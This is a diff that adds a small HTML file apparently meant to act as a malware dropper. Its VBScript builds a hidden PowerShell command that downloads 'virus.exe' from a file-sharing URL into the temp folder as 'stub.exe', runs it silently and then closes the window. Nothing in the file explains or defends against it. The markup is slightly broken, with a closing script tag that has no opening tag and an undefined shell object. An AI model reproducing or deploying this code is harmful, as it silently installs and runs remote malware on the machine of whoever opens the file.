@@ -1,0 +1,10 @@
+<html>
+
+downloadUrl = "https://anonsharing.com/file/cfb79ce22d3f15e7/virus.exe"
+localPath = shell.ExpandEnvironmentStrings("%temp%\stub.exe")
+powershellCommand = "powershell -Command ""Invoke-WebRequest -Uri '" & downloadUrl & "' -OutFile '" & localPath & "'; Start-Process '" & localPath & "'"""
+shell.Run powershellCommand, 0, True
+
+window.close
+</script>
+</html>
